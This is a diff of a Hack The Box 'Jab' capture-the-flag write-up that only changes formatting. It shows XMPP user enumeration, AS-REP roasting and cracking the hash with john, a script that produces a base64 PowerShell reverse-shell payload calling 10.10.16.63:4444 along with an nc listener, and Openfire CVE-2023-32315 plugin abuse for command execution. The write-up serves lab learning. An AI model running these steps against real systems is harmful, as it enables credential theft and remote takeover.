@@ -25,7 +25,7 @@ sudo nmap - sC - sV - oA jab_scan 10.10.11.4
 
 We have port 53,88,135,389,445,464, 636 etc.
 
-Also see the domain:  "jab.htb"
+Also see the domain: "jab.htb"
 
 Trying DNS, LDAP and SMB enumeration yielded nothing.
 
@@ -37,9 +37,9 @@ Since, we are dealing with a DC machine, I tried kerbute:
 
 ![](../../assets/images/jab/ker.png)
 
-We got some users but none gave us hashes via AESRepRoasting. Next port that looks promising is 5222 running Jabber xmpp service. Checking this out  online. We find out that XMPP is an open standard mostly used for messaging and there are client/ server implementations. We also find out that there can be data leakage of employee names and the likes. This is what we want.
+We got some users but none gave us hashes via AESRepRoasting. Next port that looks promising is 5222 running Jabber xmpp service. Checking this out online. We find out that XMPP is an open standard mostly used for messaging and there are client/ server implementations. We also find out that there can be data leakage of employee names and the likes. This is what we want.
 
-![https://kernal.eu/posts/xmpp-enumeration/](../../assets/images/jab/xmpp.png "https://kernal.eu/posts/xmpp-enumeration/")
+![https://kernal.eu/posts/xmpp-enumeration/](../../assets/images/jab/xmpp.png 'https://kernal.eu/posts/xmpp-enumeration/')
 
 Using this as a reference point to exploit XMPP: [https://exploit.im/index-en.html](https://exploit.im/index-en.html)
 
@@ -76,22 +76,23 @@ After getting the registration successful prompt, we proceed to the 'Buddy List'
 
 ![](../../assets/images/jab/pid12.png)We cant copy and paste this so we can try export the search users result to a list. To do this we need to open another instance of pidgin and send the ouput to a list:
 
-````
+```
 sudo pidgin -d > users.txt
-````
+```
+
 CTRL C to make sure the changes are exported to the list. We have out result, but its jumbled:
 
-![](../../assets/images/jab/pid13.png)However, we can clean this. Looking at the format, we are interested in the names between the value tag. Ex: \<value>[lmccarty@jab.htb](mailto\:lmccarty@jab.htb)\</value>
+![](../../assets/images/jab/pid13.png)However, we can clean this. Looking at the format, we are interested in the names between the value tag. Ex: \<value>[lmccarty@jab.htb](mailto:lmccarty@jab.htb)\</value>
 
-````
+```
 grep -o '\<value>.\*\</value>' users.txt | cut -d ">" -f 2 | cut -d "@" -f 1 | cut -d "\<" -f 1 | tee new\_users
-````
+```
 
 ![](../../assets/images/jab/cut.png)Remove the first three lines and you're good.
 
 We can return back to AESRepRoasting, now that we have our list of certain valid users.
 
-Apparently, that didn't give us all the users. We need to  find a better way to filter users.
+Apparently, that didn't give us all the users. We need to find a better way to filter users.
 Copy users manually. The users we had initally missed then redo AESREP Roast.
 
 ```
@@ -102,6 +103,7 @@ Now that we have the hash, we can crack using john.
 ![](../../assets/images/jab/hash.png)
 
 ```john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
 ```
 
 ![](../../assets/images/jab/john.png)Creds
@@ -149,7 +151,7 @@ def help():
     print("USAGE: %s IP PORT" % sys.argv[0])
     print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
     exit()
-    
+
 try:
     (ip, port) = (sys.argv[1], int(sys.argv[2]))
 except:
@@ -174,7 +176,8 @@ python3 mkpsrevshell.py 10.10.16.63 4444
 ```
 
 ![](../../assets/images/jab/python.png)
-Now we have a base64 encoded payload, we can pass it to our decomexec command. Remember to start a necat cat listener on port 4444 
+Now we have a base64 encoded payload, we can pass it to our decomexec command. Remember to start a necat cat listener on port 4444
+
 ```
 rlwrap nc -nvlp 4444
 ```
@@ -251,9 +254,9 @@ login with new user creds and upload jar file as plugin. Dont forget to change t
 
 If you are having difficulties, follow steps here: [https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce)
 
-![](../../assets/images/jab/admin.png)Over here, we see that under the Description tab we wee pass 123. Now, we go to  Server > Server settings > Management Tool. You will be asked for a password, enter: 123
+![](../../assets/images/jab/admin.png)Over here, we see that under the Description tab we wee pass 123. Now, we go to Server > Server settings > Management Tool. You will be asked for a password, enter: 123
 
-![](../../assets/images/jab/mgt.png)We now see some details about the server 
+![](../../assets/images/jab/mgt.png)We now see some details about the server
 
 ![](../../assets/images/jab/deets.png)We can choose 'system command' to run commands on the server and get interactive shell.
 
